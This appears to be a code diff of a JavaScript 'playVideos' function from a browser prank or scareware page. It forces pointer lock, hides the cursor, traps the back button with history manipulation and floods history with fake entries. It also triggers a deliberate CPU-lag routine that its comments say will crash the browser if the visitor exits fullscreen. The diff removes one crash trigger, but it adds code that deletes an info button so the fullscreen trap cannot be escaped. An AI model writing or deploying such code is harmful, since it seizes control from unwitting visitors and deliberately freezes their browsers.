@@ -72,11 +72,11 @@ function playVideos() {
   // 2. Request/Enter Pointer Lock
   if (document.documentElement.requestPointerLock) {
     document.documentElement.requestPointerLock();
-  } else if (document.documentElement.webkitRequestPointerLock) { // For Safari
+  } else if (document.documentElement.webkitRequestPointerLock) {
     document.documentElement.webkitRequestPointerLock();
-  } else if (document.documentElement.mozRequestPointerLock) { // For Firefox
+  } else if (document.documentElement.mozRequestPointerLock) {
     document.documentElement.mozRequestPointerLock();
-  } else if (document.documentElement.msRequestPointerLock) { // For IE/Edge
+  } else if (document.documentElement.msRequestPointerLock) {
     document.documentElement.msRequestPointerLock();
   }
   // 3. Ask Before Closing
@@ -87,11 +87,12 @@ function playVideos() {
   history.pushState(null, "", location.href);
   window.onpopstate = function() {
     history.pushState(null, "", location.href);
-    activateCPULag(); // If they try to go back, crash the browser
   };
   // 5. Hide Cursor
   document.body.style.cursor = "none";
-  // 6. Fill History with Fake Entries
+  // 6. Remove info button because it disables fullscreen
+  document.querySelector('i').remove();
+  // 7. Fill History with Fake Entries
   for (let i = 0; i < 20; i++) {
     history.pushState(null, "", location.href + "?p=" + i);
   }
@@ -102,7 +103,7 @@ function playVideos() {
   } else if (params.has("letmeout")) {
     history.replaceState(null, "", location.pathname + "?letmeout");
   }
-  // 7. Crash Browser
+  // 8. Crash Browser
   function activateCPULag() {
     if (cpuLagActive) return; // Prevent multiple activations
     cpuLagActive = true;
@@ -115,7 +116,7 @@ function playVideos() {
       }
     }, 10);
   }
-  // 8. If they exit fullscreen, crash the browser
+  // 9. If they exit fullscreen, crash the browser
   document.addEventListener("fullscreenchange", () => {
     if (!document.fullscreenElement) {
       activateCPULag();
